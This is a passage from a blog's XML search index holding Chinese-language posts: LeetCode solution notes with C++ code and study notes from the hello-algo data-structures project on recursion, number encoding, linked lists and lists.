<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Leetcode刷题笔记</title>
    <link href="/2024/07/31/Leetcode%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/"/>
    <url>/2024/07/31/Leetcode%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h4 id="LCP40-心算挑战"><a href="#LCP40-心算挑战" class="headerlink" title="LCP40 心算挑战"></a>LCP40 心算挑战</h4><h5 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h5><p>「力扣挑战赛」心算项目的挑战比赛中，要求选手从 <code>N</code> 张卡牌中选出 <code>cnt</code> 张卡牌，若这 <code>cnt</code> 张卡牌数字总和为偶数，则选手成绩「有效」且得分为 <code>cnt</code> 张卡牌数字总和。 给定数组 <code>cards</code> 和 <code>cnt</code>，其中 <code>cards[i]</code> 表示第 <code>i</code> 张卡牌上的数字。 请帮参赛选手计算最大的有效得分。若不存在获取有效得分的卡牌方案，则返回 0。</p><blockquote><p>输入：<code>cards = [1,2,8,9], cnt = 3</code></p><p>输出：<code>18</code></p><p>解释：选择数字为 1、8、9 的这三张卡牌，此时可获得最大的有效得分 1+8+9&#x3D;18。</p></blockquote><h5 id="思路和算法"><a href="#思路和算法" class="headerlink" title="思路和算法"></a>思路和算法</h5><p>将<code>cards</code>从大到小排序后，先贪心的将前<code>cnt</code>个数字加起来，若此时<code>sum</code>为偶数，直接返回即可。</p><p>若此时答案为奇数，有两种方案:</p><ul><li><p>在数组后面找到一个最大的奇数与前<code>cnt</code>个数中最小的偶数进行替换；</p></li><li><p>在数组后面找到一个最大的偶数与前<code>cnt</code>个数中最小的奇数进行替换。</p></li></ul><p>两种方案选最大值即可。</p><h5 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">maxmiumScore</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; cards, <span class="hljs-type">int</span> cnt)</span> </span>&#123;<br>        <span class="hljs-built_in">sort</span>(cards.<span class="hljs-built_in">begin</span>(), cards.<span class="hljs-built_in">end</span>(), <span class="hljs-built_in">greater</span>&lt;<span class="hljs-type">int</span>&gt;());<br>        <span class="hljs-type">int</span> score = <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> odd = <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> even = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; cnt; ++i) &#123;<br>        score += cards[i];<br>        <span class="hljs-keyword">if</span>(cards[i] %<span class="hljs-number">2</span> == <span class="hljs-number">0</span>) even = cards[i];<br>        <span class="hljs-keyword">else</span> odd = cards[i];<br>        &#125;<br>        <span class="hljs-keyword">if</span>(score % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-keyword">return</span> score;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = cnt; j &lt; cards.<span class="hljs-built_in">size</span>(); j++)<br>            &#123;<br>            <span class="hljs-keyword">if</span>(cards[j] %<span class="hljs-number">2</span> == <span class="hljs-number">0</span> &amp;&amp; odd) <br>                ans = <span class="hljs-built_in">max</span>(ans, score - odd + cards[j]);<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (even)<br>                ans = <span class="hljs-built_in">max</span>(ans, score - even + cards[j]);<br>            &#125;<br><br>        &#125;<br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h5 id="复杂度分析"><a href="#复杂度分析" class="headerlink" title="复杂度分析"></a>复杂度分析</h5><p>时间复杂度：$O(nlogn)$，其中$n$为数组的长度，主要开销在排序。</p><p>空间复杂度：$O(1)$。</p><h4 id="T258-各位相加"><a href="#T258-各位相加" class="headerlink" title="T258 各位相加"></a>T258 各位相加</h4><h5 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h5><p>给定一个非负整数 <code>num</code>，反复将各个位上的数字相加，直到结果为一位数。返回这个结果。</p><blockquote><p>输入: num &#x3D; 38<br>    输出: 2<br>    解释: 各位相加的过程为：<br>    38 –&gt; 3 + 8 –&gt; 11<br>    11 –&gt; 1 + 1 –&gt; 2<br>    由于 2 是一位数，所以返回 2。</p></blockquote><p><strong>进阶：</strong>你可以不使用循环或者递归，在 <code>O(1)</code> 时间复杂度内解决这个问题吗？</p><h5 id="思路和算法-1"><a href="#思路和算法-1" class="headerlink" title="思路和算法"></a>思路和算法</h5><p><a href="https://leetcode.cn/problems/add-digits/solutions/1301157/ge-wei-xiang-jia-by-leetcode-solution-u4kj/">https://leetcode.cn/problems/add-digits/solutions/1301157/ge-wei-xiang-jia-by-leetcode-solution-u4kj/</a></p><p>假设整数<code>num</code>的十进制表示有n位，从最低位到最高位依次是$a_0$到$a_{n−1}$，则 <code>num</code>可以写成<br>$$<br>\sum_{i&#x3D;0}^{n-1}a_i \times (10^i-1) + \sum_{i&#x3D;0}^{n-1}a_i<br>$$</p><p>对于任意非负整数 $i$，$10^i−1$ 都是 9 的倍数。由此可得<code>num</code>与其各位相加的结果模 9 同余。重复计算各位相加的结果直到结果为一位数时，该一位数即为 num 的数根，num 与其数根模 9 同余。由于最终结果取值为0～9，我们可以对<code>num</code>先减去1再取余，最后加上1，这样就能同时处理<code>num</code>是9的倍数（结果为9）和<code>num</code>为0的情况。</p><h5 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">addDigits</span><span class="hljs-params">(<span class="hljs-type">int</span> num)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> (num - <span class="hljs-number">1</span>) % <span class="hljs-number">9</span> + <span class="hljs-number">1</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h5 id="复杂度分析-1"><a href="#复杂度分析-1" class="headerlink" title="复杂度分析"></a>复杂度分析</h5><p>时间复杂度：$O(1)$。</p><p>空间复杂度：$O(1)$。</p><h4 id="T3128-直角三角形"><a href="#T3128-直角三角形" class="headerlink" title="T3128 直角三角形"></a>T3128 直角三角形</h4><h5 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h5><p>给你一个二维 boolean 矩阵 <code>grid</code> 。</p><p>请你返回使用 <code>grid</code> 中的 3 个元素可以构建的<strong>直角三角形</strong>数目，且满足3个元素值<strong>都</strong>为1。</p><p><strong>注意：</strong></p><ul><li>如果 <code>grid</code> 中 3 个元素满足：一个元素与另一个元素在 <strong>同一行</strong>，同时与第三个元素在 <strong>同一列</strong> ，那么这 3 个元素称为一个 <strong>直角三角形</strong> 。这 3 个元素互相之间不需要相邻。</li></ul><blockquote><p>输入：grid &#x3D; [[0,1,0],[0,1,1],[0,1,0]]</p><p>输出：2</p><p>解释：有 2 个直角三角形。</p></blockquote><h5 id="思路和算法-2"><a href="#思路和算法-2" class="headerlink" title="思路和算法"></a>思路和算法</h5><p><a href="https://leetcode.cn/problems/right-triangles/solutions/2861202/zhi-jiao-san-jiao-xing-by-leetcode-solut-zbz2/">https://leetcode.cn/problems/right-triangles/solutions/2861202/zhi-jiao-san-jiao-xing-by-leetcode-solut-zbz2/</a></p><p>直接枚举三个点判断是否为直角三角形的方法未免过于低效，我们可以固定一个点，然后来统计其他两个点的合法方法数。</p><p>考虑枚举两条直角边的交点，然后将「该点所在行的其他点」与「该点所在列的其他点」一一匹配，即可得到所有以该点为直角边交点的所有方案。设 <code>row</code> 为交点所在行 1 的个数，<code>col</code> 为交点所在列 1 的个数，那么它的贡献是 <code>(row−1)×(col−1)</code>，将所有交点的贡献加起来就是答案。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-title">numberOfRightTriangles</span><span class="hljs-params">(vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; grid)</span> </span>&#123;<br>        <span class="hljs-type">int</span> n = grid.<span class="hljs-built_in">size</span>(), m = grid[<span class="hljs-number">0</span>].<span class="hljs-built_in">size</span>();<br>        <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">col</span><span class="hljs-params">(m)</span></span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; m; j++) &#123;<br>                col[j] += grid[i][j];<br>            &#125;<br>        &#125;<br>        <span class="hljs-type">long</span> <span class="hljs-type">long</span> res = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>            <span class="hljs-type">int</span> row = <span class="hljs-built_in">accumulate</span>(grid[i].<span class="hljs-built_in">begin</span>(), grid[i].<span class="hljs-built_in">end</span>(), <span class="hljs-number">0</span>);<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; m; j++) &#123;<br>                <span class="hljs-keyword">if</span> (grid[i][j] == <span class="hljs-number">1</span>) &#123;<br>                    res += (row - <span class="hljs-number">1</span>) * (col[j] - <span class="hljs-number">1</span>);<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h5 id="复杂度分析-2"><a href="#复杂度分析-2" class="headerlink" title="复杂度分析"></a>复杂度分析</h5><p>时间复杂度：$O(nm)$，其中$n$是$grid$的行数，$m$是$grid$的列数。</p><p>空间复杂度：$O(m)$。</p>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>算法</tag>
      
      <tag>数据结构</tag>
      
      <tag>招聘</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>hello-algo 学习笔记</title>
    <link href="/2024/07/22/hello-algo-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2024/07/22/hello-algo-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>写在前面：最近正准备复习数据结构，想找一些文字看，这个<strong>hello-algo</strong>项目躺在我的GitHub仓库里很久了一直没打开，因此最近闲暇时间看一遍，笔记里都是我对项目内容的摘抄，主要是对我个人比较新鲜的内容的记录，所以看起来会很不连贯和完整～</p><p>项目链接：<a href="https://www.hello-algo.com/">https://www.hello-algo.com</a></p><p class="note note-warning">笔记内容大部分都是对项目的直接拷贝，转载请使用项目对应内容，如果涉及侵权请联系删除。</p><h3 id="第2章-复杂度分析"><a href="#第2章-复杂度分析" class="headerlink" title="第2章 复杂度分析"></a>第2章 复杂度分析</h3><h4 id="尾递归"><a href="#尾递归" class="headerlink" title="尾递归"></a>尾递归</h4><p><strong>如果函数在返回前的最后一步才进行递归调用</strong>，则该函数可以被编译器或解释器优化，使其在空间效率上与迭代相当。这种情况被称为尾递归（tail recursion）。</p><ul><li><strong>普通递归</strong>：当函数返回到上一层级的函数后，需要继续执行代码，因此系统需要保存上一层调用的上下文。</li><li><strong>尾递归</strong>：递归调用是函数返回前的最后一个操作，这意味着函数返回到上一层级后，无须继续执行其他操作，因此系统无须保存上一层函数的上下文。</li></ul><p>以计算$1+2+3+···+n$为例，我们可以将结果变量 <code>res</code> 设为函数参数，从而实现尾递归：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">tail_recur</span>(<span class="hljs-params">n, res</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;尾递归&quot;&quot;&quot;</span><br>    <span class="hljs-comment"># 终止条件</span><br>    <span class="hljs-keyword">if</span> n == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> res<br>    <span class="hljs-comment"># 尾递归调用</span><br>    <span class="hljs-keyword">return</span> tail_recur(n - <span class="hljs-number">1</span>, res + n)<br></code></pre></td></tr></table></figure><p>对比普通递归和尾递归，两者的求和操作的执行点是不同的。</p><ul><li><strong>普通递归</strong>：求和操作是在“归”的过程中执行的，每层返回后都要再执行一次求和操作。</li><li><strong>尾递归</strong>：求和操作是在“递”的过程中执行的，“归”的过程只需层层返回。</li></ul><p><img src="https://www.hello-algo.com/chapter_computational_complexity/iteration_and_recursion.assets/tail_recursion_sum.png" srcset="/img/loading.gif" lazyload></p><p class="note note-danger">请注意，许多编译器或解释器并不支持尾递归优化。例如，Python 默认不支持尾递归优化，因此即使函数是尾递归形式，仍然可能会遇到栈溢出问题。</p><h3 id="第3章-数据结构"><a href="#第3章-数据结构" class="headerlink" title="第3章 数据结构"></a>第3章 数据结构</h3><h4 id="原码、反码和补码"><a href="#原码、反码和补码" class="headerlink" title="原码、反码和补码"></a>原码、反码和补码</h4><p>首先需要指出，<strong>数字是以“补码”的形式存储在计算机中的</strong>。在分析这样做的原因之前，首先给出三者的定义。</p><ul><li><strong>原码</strong>：我们将数字的二进制表示的最高位视为符号位，其中0表示正数，1表示负数，其余位表示数字的值。</li><li><strong>反码</strong>：正数的反码与其原码相同，负数的反码是对其原码除符号位外的所有位取反。</li><li><strong>补码</strong>：正数的补码与其原码相同，负数的补码是在其反码的基础上加1。</li></ul><p><img src="https://www.hello-algo.com/chapter_data_structure/number_encoding.assets/1s_2s_complement.png" srcset="/img/loading.gif" lazyload></p><h4 id="浮点数编码"><a href="#浮点数编码" class="headerlink" title="浮点数编码"></a>浮点数编码</h4><p><strong>浮点数 <code>float</code> 采用了不同的表示方式</strong>。记一个 32 比特长度的二进制数为：</p><div class="arithmatex">\[b_{31} b_{30} b_{29} \ldots b_2 b_1 b_0\]</div><p>根据 IEEE 754 标准，32-bit 长度的 <code>float</code> 由以下三个部分构成。</p><ul><li>符号位 <span class="arithmatex">\(\mathrm{S}\)</span> ：占 1 位 ，对应 <span class="arithmatex">\(b_{31}\)</span> 。</li><li>指数位 <span class="arithmatex">\(\mathrm{E}\)</span> ：占 8 位 ，对应 <span class="arithmatex">\(b_{30} b_{29} \ldots b_{23}\)</span> 。</li><li>分数位 <span class="arithmatex">\(\mathrm{N}\)</span> ：占 23 位 ，对应 <span class="arithmatex">\(b_{22} b_{21} \ldots b_0\)</span> 。</li></ul><p>二进制数 <code>float</code> 对应值的计算方法为：</p><div class="arithmatex">\[\text {val} = (-1)^{b_{31}} \times 2^{\left(b_{30} b_{29} \ldots b_{23}\right)_2-127} \times\left(1 . b_{22} b_{21} \ldots b_0\right)_2\]</div><p>转化到十进制下的计算公式为：</p><div class="arithmatex">\[\text {val}=(-1)^{\mathrm{S}} \times 2^{\mathrm{E} -127} \times (1 + \mathrm{N})\]</div><p>其中各项的取值范围为：</p><div class="arithmatex">\[\begin{aligned}\mathrm{S} \in &amp; \{ 0, 1\}, \quad \mathrm{E} \in \{ 1, 2, \dots, 254 \} \newline(1 + \mathrm{N}) = &amp; (1 + \sum_{i=1}^{23} b_{23-i} 2^{-i}) \subset [1, 2 - 2^{-23}]\end{aligned}\]</div><p><img src="https://www.hello-algo.com/chapter_data_structure/number_encoding.assets/ieee_754_float.png" srcset="/img/loading.gif" lazyload></p><p><strong>尽管浮点数 <code>float</code> 扩展了取值范围，但其副作用是牺牲了精度</strong>。整数类型 <code>int</code> 将全部 32 比特用于表示数字，数字是均匀分布的；而由于指数位的存在，浮点数 <code>float</code> 的数值越大，相邻两个数字之间的差值就会趋向越大。</p><p>如表所示，指数位 <span class="arithmatex">\(\mathrm{E} = 0\)</span> 和 <span class="arithmatex">\(\mathrm{E} = 255\)</span> 具有特殊含义，<strong>用于表示零、无穷大、<span class="arithmatex">\(\mathrm{NaN}\)</span> 等</strong>。</p><div class="center-table"><table><thead><tr><th>指数位 E</th><th>分数位 <span class="arithmatex">\(\mathrm{N} = 0\)</span></th><th>分数位 <span class="arithmatex">\(\mathrm{N} \ne 0\)</span></th><th>计算公式</th></tr></thead><tbody><tr><td><span class="arithmatex">\(0\)</span></td><td><span class="arithmatex">\(\pm 0\)</span></td><td>次正规数</td><td><span class="arithmatex">\((-1)^{\mathrm{S}} \times 2^{-126} \times (0.\mathrm{N})\)</span></td></tr><tr><td><span class="arithmatex">\(1, 2, \dots, 254\)</span></td><td>正规数</td><td>正规数</td><td><span class="arithmatex">\((-1)^{\mathrm{S}} \times 2^{(\mathrm{E} -127)} \times (1.\mathrm{N})\)</span></td></tr><tr><td><span class="arithmatex">\(255\)</span></td><td><span class="arithmatex">\(\pm \infty\)</span></td><td><span class="arithmatex">\(\mathrm{NaN}\)</span></td><td></td></tr></tbody></table></div><h4 id="字符编码"><a href="#字符编码" class="headerlink" title="字符编码"></a>字符编码</h4><p>Unicode编码的介绍：<a href="https://www.hello-algo.com/chapter_data_structure/character_encoding/#343-unicode">https://www.hello-algo.com/chapter_data_structure/character_encoding/#343-unicode</a></p><p><img src="https://www.hello-algo.com/chapter_data_structure/character_encoding.assets/utf-8_hello_algo.png" srcset="/img/loading.gif" lazyload></p><h3 id="第4章-数组与链表"><a href="#第4章-数组与链表" class="headerlink" title="第4章 数组与链表"></a>第4章 数组与链表</h3><h4 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h4><p>链表（linked list）是一种线性数据结构，其中的每个元素都是一个节点对象，各个节点通过“引用”相连接。引用记录了下一个节点的内存地址，通过它可以从当前节点访问到下一个节点。链表的设计使得各个节点可以分散存储在内存各处，它们的内存地址无须连续。如以下代码所示，链表节点 <code>ListNode</code> 除了包含值，还需额外保存一个引用（指针）。因此在相同数据量下，<strong>链表比数组占用更多的内存空间</strong>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* 链表节点结构体 */</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">ListNode</span> &#123;<br>    <span class="hljs-type">int</span> val;         <span class="hljs-comment">// 节点值</span><br>    ListNode *next;  <span class="hljs-comment">// 指向下一节点的指针</span><br>    <span class="hljs-built_in">ListNode</span>(<span class="hljs-type">int</span> x) : <span class="hljs-built_in">val</span>(x), <span class="hljs-built_in">next</span>(<span class="hljs-literal">nullptr</span>) &#123;&#125;  <span class="hljs-comment">// 构造函数</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>建立链表分为两步，第一步是初始化各个节点对象，第二步是构建节点之间的引用关系。初始化完成后，我们就可以从链表的头节点出发，通过引用指向 <code>next</code> 依次访问所有节点。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* 初始化链表 1 -&gt; 3 -&gt; 2 -&gt; 5 -&gt; 4 */</span><br><span class="hljs-comment">// 初始化各个节点</span><br>ListNode* n0 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ListNode</span>(<span class="hljs-number">1</span>);<br>ListNode* n1 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ListNode</span>(<span class="hljs-number">3</span>);<br>ListNode* n2 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ListNode</span>(<span class="hljs-number">2</span>);<br>ListNode* n3 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ListNode</span>(<span class="hljs-number">5</span>);<br>ListNode* n4 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ListNode</span>(<span class="hljs-number">4</span>);<br><span class="hljs-comment">// 构建节点之间的引用</span><br>n0-&gt;next = n1;<br>n1-&gt;next = n2;<br>n2-&gt;next = n3;<br>n3-&gt;next = n4;<br></code></pre></td></tr></table></figure><p>数组整体是一个变量，比如数组 <code>nums</code> 包含元素 <code>nums[0]</code> 和 <code>nums[1]</code> 等，而链表是由多个独立的节点对象组成的。<strong>我们通常将头节点当作链表的代称</strong>，比如以上代码中的链表可记作链表 <code>n0</code> 。</p><p><img src="https://www.hello-algo.com/chapter_array_and_linkedlist/linked_list.assets/linkedlist_common_types.png" srcset="/img/loading.gif" lazyload></p><p>单向链表通常用于实现栈、队列、哈希表和图等数据结构。</p><ul><li><strong>栈与队列</strong>：当插入和删除操作都在链表的一端进行时，它表现的特性为先进后出，对应栈；当插入操作在链表的一端进行，删除操作在链表的另一端进行，它表现的特性为先进先出，对应队列。</li><li><strong>哈希表</strong>：链式地址是解决哈希冲突的主流方案之一，在该方案中，所有冲突的元素都会被放到一个链表中。</li><li><strong>图</strong>：邻接表是表示图的一种常用方式，其中图的每个顶点都与一个链表相关联，链表中的每个元素都代表与该顶点相连的其他顶点。</li></ul><p>双向链表常用于需要快速查找前一个和后一个元素的场景。</p><ul><li><strong>高级数据结构</strong>：比如在红黑树、B 树中，我们需要访问节点的父节点，这可以通过在节点中保存一个指向父节点的引用来实现，类似于双向链表。</li><li><strong>浏览器历史</strong>：在网页浏览器中，当用户点击前进或后退按钮时，浏览器需要知道用户访问过的前一个和后一个网页。双向链表的特性使得这种操作变得简单。</li><li><strong>LRU 算法</strong>：在缓存淘汰（LRU）算法中，我们需要快速找到最近最少使用的数据，以及支持快速添加和删除节点。这时候使用双向链表就非常合适。</li></ul><p>环形链表常用于需要周期性操作的场景，比如操作系统的资源调度。</p><ul><li><strong>时间片轮转调度算法</strong>：在操作系统中，时间片轮转调度算法是一种常见的 CPU 调度算法，它需要对一组进程进行循环。每个进程被赋予一个时间片，当时间片用完时，CPU 将切换到下一个进程。这种循环操作可以通过环形链表来实现。</li><li><strong>数据缓冲区</strong>：在某些数据缓冲区的实现中，也可能会使用环形链表。比如在音频、视频播放器中，数据流可能会被分成多个缓冲块并放入一个环形链表，以便实现无缝播放。</li></ul><h4 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h4><p>列表（list）是一个抽象的数据结构概念，它表示元素的有序集合，支持元素访问、修改、添加、删除和遍历等操作，无须使用者考虑容量限制的问题。列表可以基于链表或数组实现。</p><ul><li>链表天然可以看作一个列表，其支持元素增删查改操作，并且可以灵活动态扩容。</li><li>数组也支持元素增删查改，但由于其长度不可变，因此只能看作一个具有长度限制的列表。</li></ul><p>当使用数组实现列表时，<strong>长度不可变的性质会导致列表的实用性降低</strong>。这是因为我们通常无法事先确定需要存储多少数据，从而难以选择合适的列表长度。若长度过小，则很可能无法满足使用需求；若长度过大，则会造成内存空间浪费。</p><p>为解决此问题，我们可以使用动态数组（dynamic array）来实现列表。它继承了数组的各项优点，并且可以在程序运行过程中进行动态扩容。</p><p>实际上，<strong>许多编程语言中的标准库提供的列表是基于动态数组实现的</strong>，例如 Python 中的 <code>list</code> 、Java 中的 <code>ArrayList</code> 、C++ 中的 <code>vector</code> 和 C# 中的 <code>List</code> 等。在接下来的讨论中，我们将把“列表”和“动态数组”视为等同的概念。</p><h5 id="1-初始化列表"><a href="#1-初始化列表" class="headerlink" title="1. 初始化列表"></a>1. 初始化列表</h5><p>我们通常使用“无初始值”和“有初始值”这两种初始化方法：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* 初始化列表 */</span><br><span class="hljs-comment">// 需注意，C++ 中 vector 即是本文描述的 nums</span><br><span class="hljs-comment">// 无初始值</span><br>vector&lt;<span class="hljs-type">int</span>&gt; nums1;<br><span class="hljs-comment">// 有初始值</span><br>vector&lt;<span class="hljs-type">int</span>&gt; nums = &#123; <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span> &#125;;<br></code></pre></td></tr></table></figure><h5 id="2-访问元素"><a href="#2-访问元素" class="headerlink" title="2. 访问元素"></a>2. 访问元素</h5><p>列表本质上是数组，因此可以在$O(1)$时间内访问和更新元素，效率很高。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* 访问元素 */</span><br><span class="hljs-type">int</span> num = nums[<span class="hljs-number">1</span>];  <span class="hljs-comment">// 访问索引 1 处的元素</span><br><br><span class="hljs-comment">/* 更新元素 */</span><br>nums[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;  <span class="hljs-comment">// 将索引 1 处的元素更新为 0</span><br></code></pre></td></tr></table></figure><h5 id="3-插入与删除元素"><a href="#3-插入与删除元素" class="headerlink" title="3. 插入与删除元素"></a>3. 插入与删除元素</h5><p>相较于数组，列表可以自由地添加与删除元素。在列表尾部添加元素的时间复杂度为$O(1)$，但插入和删除元素的效率仍与数组相同，时间复杂度为$O(n)$。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* 清空列表 */</span><br>nums.<span class="hljs-built_in">clear</span>();<br><br><span class="hljs-comment">/* 在尾部添加元素 */</span><br>nums.<span class="hljs-built_in">push_back</span>(<span class="hljs-number">1</span>);<br>nums.<span class="hljs-built_in">push_back</span>(<span class="hljs-number">3</span>);<br>nums.<span class="hljs-built_in">push_back</span>(<span class="hljs-number">2</span>);<br>nums.<span class="hljs-built_in">push_back</span>(<span class="hljs-number">5</span>);<br>nums.<span class="hljs-built_in">push_back</span>(<span class="hljs-number">4</span>);<br><br><span class="hljs-comment">/* 在中间插入元素 */</span><br>nums.<span class="hljs-built_in">insert</span>(nums.<span class="hljs-built_in">begin</span>() + <span class="hljs-number">3</span>, <span class="hljs-number">6</span>);  <span class="hljs-comment">// 在索引 3 处插入数字 6</span><br><br><span class="hljs-comment">/* 删除元素 */</span><br>nums.<span class="hljs-built_in">erase</span>(nums.<span class="hljs-built_in">begin</span>() + <span class="hljs-number">3</span>);      <span class="hljs-comment">// 删除索引 3 处的元素</span><br></code></pre></td></tr></table></figure><h5 id="4-遍历列表"><a href="#4-遍历列表" class="headerlink" title="4. 遍历列表"></a>4. 遍历列表</h5><p>与数组一样，列表可以根据索引遍历，也可以直接遍历各元素。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* 通过索引遍历列表 */</span><br><span class="hljs-type">int</span> count = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span 